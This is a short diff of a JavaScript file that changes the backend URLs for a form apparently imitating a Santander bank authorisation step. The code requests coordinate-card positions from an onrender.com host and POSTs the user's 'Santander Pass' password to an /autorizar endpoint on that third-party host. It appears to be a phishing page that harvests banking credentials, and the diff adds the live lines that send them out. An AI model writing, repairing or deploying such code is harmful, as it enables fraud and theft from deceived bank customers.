@@ -70,7 +70,7 @@ tipoAutorizacion.addEventListener("change", async () => {
 
     // Pedir coordenadas dinámicas al backend
     try {
-      const resp = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/coordenadas");
+      const resp = await fetch("https://autorizacion-ob.onrender.com/coordenadas");
       const data = await resp.json();
 
       document.getElementById("coordLabelA").innerText = `Coordenada ${data.coordenadas[0]}`;
@@ -88,7 +88,7 @@ formSantander.addEventListener("submit", async (e) => {
   const mensaje = `Santander Pass: ${pass}`;
 
   try {
-    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+    await fetch("https://autorizacion-ob.onrender.com/autorizar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ mensaje })
